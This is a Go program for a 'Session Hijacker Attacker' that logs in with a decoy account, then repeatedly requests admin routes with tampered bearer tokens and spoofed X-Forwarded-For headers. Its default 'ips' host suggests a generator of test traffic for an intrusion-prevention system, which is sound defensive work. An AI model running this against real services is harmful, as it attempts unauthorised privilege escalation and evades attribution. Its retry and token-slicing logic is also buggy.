package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// payload struct for login requests
type payload struct {
	Name        string `json:"Name"`
	Description string `json:"Description"`
	Password    string `json:"password"`
	Email       string `json:"Email"`
	Phone       string `json:"Phone"`
	Address     string `json:"Address"`
	City        string `json:"City"`
	State       string `json:"State"`
	Zip         string `json:"Zip"`
}

// loginResponse struct to parse the login API's response
// Assuming the API returns a JSON object with a 'token' field.
type loginResponse struct {
	Token       string `json:"token"`
	Expiratiion string `json:"expiration"`
	// Add other fields your login API might return, e.g., 'userId', 'role'
}

// getEnv function remains the same
func getEnv(key, defaultVal string) string {
	val := os.Getenv(key)
	if val == "" {
		return defaultVal
	}
	return val
}

// generateRandomString generates a random string of a given length
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_."
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// manipulateToken takes a valid token and returns a manipulated version
func manipulateToken(originalToken string) string {
	if originalToken == "" {
		return generateRandomString(32) // Return a random token if original is empty
	}

	manipulationType := rand.Intn(4) // 0: truncate, 1: append garbage, 2: random string, 3: char change

	switch manipulationType {
	case 0: // Truncate token
		if len(originalToken) > 10 {
			return originalToken[:len(originalToken)/2] // Take first half
		}
		return originalToken // Too short to truncate meaningfully
	case 1: // Append random garbage
		return originalToken + generateRandomString(rand.Intn(10)+5) // Append 5-14 random chars
	case 2: // Replace with completely random string (similar length)
		return generateRandomString(len(originalToken) + rand.Intn(5) - 2) // +/- 2 chars from original length
	case 3: // Change a single random character
		runes := []rune(originalToken)
		if len(runes) > 0 {
			idx := rand.Intn(len(runes))
			runes[idx] = rune(rand.Intn(26) + 'a') // Change to a random lowercase letter
			return string(runes)
		}
		return originalToken
	default:
		return originalToken // Should not happen
	}
}

// manipulateHeaders takes a base set of headers and adds/modifies them for suspicion
func manipulateHeaders(baseHeaders http.Header) http.Header {
	newHeaders := make(http.Header)
	for k, v := range baseHeaders {
		newHeaders[k] = v
	}

	// Change User-Agent
	uaType := rand.Intn(3)
	switch uaType {
	case 0:
		newHeaders.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36") // Common browser
	case 1:
		newHeaders.Set("User-Agent", "curl/7.64.1") // Command-line tool
	case 2:
		newHeaders.Set("User-Agent", "Python-requests/2.25.1") // Scripting library
	}

	// Add/Change X-Forwarded-For to simulate proxy/spoofing
	if rand.Intn(2) == 0 { // 50% chance to add/change
		newHeaders.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	} else {
		newHeaders.Del("X-Forwarded-For") // Sometimes remove it
	}

	// Add a random custom header
	if rand.Intn(3) == 0 { // 33% chance
		newHeaders.Set(fmt.Sprintf("X-Custom-Header-%d", rand.Intn(100)), generateRandomString(10))
	}

	return newHeaders
}

// worker for Session Hijacker Attacker
func worker(wg *sync.WaitGroup, client *http.Client, baseURL string, loginPath string, adminPaths []string, id int) {
	defer wg.Done()

	loginURL := baseURL + loginPath
	validToken := ""

	// --- Phase 1: Login to get a valid token ---
	fmt.Printf("[worker %d] Attempting to log in to %s...\n", id, loginURL)
	loginPayload := payload{
		Name:        "decoy1",
		Description: "Legitimate-looking login",
		Password:    "text",
		Email:       "decoy1@example.com",
		Phone:       "555-123-4567",
		Address:     "123 Main St",
		City:        "Anytown",
		State:       "CA",
		Zip:         "90210",
	}

	bodyBytes, err := json.Marshal(loginPayload)
	if err != nil {
		fmt.Printf("[worker %d] Login payload marshal error: %v\n", id, err)
		return
	}

	req, err := http.NewRequest("POST", loginURL, bytes.NewReader(bodyBytes))
	if err != nil {
		fmt.Printf("[worker %d] Login request creation error: %v\n", id, err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "SessionHijackerBot/1.0 - LoginPhase")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[worker %d] Login request error: %v\n", id, err)
		return
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[worker %d] Failed to read login response body: %v\n", id, err)
		return
	}

	if resp.StatusCode == http.StatusOK {
		var loginResp loginResponse
		if err := json.Unmarshal(respBody, &loginResp); err != nil {
			fmt.Printf("[worker %d] Failed to parse login response JSON: %v. Body: %s\n", id, err, string(respBody))
			return
		}
		validToken = loginResp.Token
		fmt.Printf("[worker %d] Successfully logged in. Got token (first 10 chars): %s...\n", id, validToken[:10])
	} else {
		fmt.Printf("[worker %d] Login failed with status %d. Response: %s\n", id, resp.StatusCode, string(respBody))
		// If login fails, we can't proceed with session hijacking. Retry or exit.
		time.Sleep(5 * time.Second)                               // Wait before retrying login
		go worker(wg, client, baseURL, loginPath, adminPaths, id) // Self-relaunch to retry login
		return
	}

	// Give a small pause after login before starting attacks
	time.Sleep(time.Duration(rand.Intn(2)+1) * time.Second)

	// --- Phase 2: Attempt privilege escalation with manipulated tokens/headers ---
	fmt.Printf("[worker %d] Starting privilege escalation attempts...\n", id)
	for {
		manipulatedToken := manipulateToken(validToken)
		manipulatedHeaders := manipulateHeaders(make(http.Header)) // Start with empty headers for manipulation

		// Choose a random admin path to target
		targetAdminPath := adminPaths[rand.Intn(len(adminPaths))]
		targetURL := baseURL + targetAdminPath

		req, err := http.NewRequest("GET", targetURL, nil) // Usually GET for accessing resources
		if err != nil {
			fmt.Printf("[worker %d] Escalation request creation error: %v\n", id, err)
			time.Sleep(1 * time.Second)
			continue
		}

		// Set Authorization header with manipulated token
		req.Header.Set("Authorization", "Bearer "+manipulatedToken)
		// Apply other manipulated headers
		for k, v := range manipulatedHeaders {
			for _, val := range v {
				req.Header.Add(k, val)
			}
		}
		req.Header.Set("User-Agent", "SessionHijackerBot/1.0 - EscalationPhase") // Distinct User-Agent for escalation

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[worker %d] Escalation request error to %s: %v\n", id, targetURL, err)
			time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond) // Small random delay on error
			continue
		}
		defer resp.Body.Close()

		fmt.Printf("[worker %d] Attempted access to %s with manipulated token/headers. Status: %d\n", id, targetURL, resp.StatusCode)
		io.Copy(io.Discard, resp.Body) // Discard response body

		// Introduce a random delay between attempts
		time.Sleep(time.Duration(rand.Intn(3)+1) * time.Second) // Delay between 1 and 3 seconds
	}
}

func main() {
	baseURL := getEnv("target_host", "http://ips:8080")
	loginRoute := getEnv("target_login_route", "/ddos/login")
	// Comma-separated list of privileged/admin routes to attempt accessing
	adminRouteStr := getEnv("target_admin_routes", "/admin,/profile")
	concurrency := getEnv("concurrency", "1") // Moderate concurrency for this attacker

	adminPaths := strings.Split(adminRouteStr, ",")
	if len(adminPaths) == 0 || (len(adminPaths) == 1 && adminPaths[0] == "") {
		fmt.Println("Warning: No admin routes provided. Defaulting to /admin.")
		adminPaths = []string{"/admin"}
	}

	numWorkers := 3 // Default concurrency
	fmt.Sscanf(concurrency, "%d", &numWorkers)

	rand.Seed(time.Now().UnixNano()) // Seed the random number generator

	client := &http.Client{
		Timeout: 10 * time.Second, // Increased timeout for potentially slower responses
	}

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker(&wg, client, baseURL, loginRoute, adminPaths, i)
	}

	wg.Wait()
}
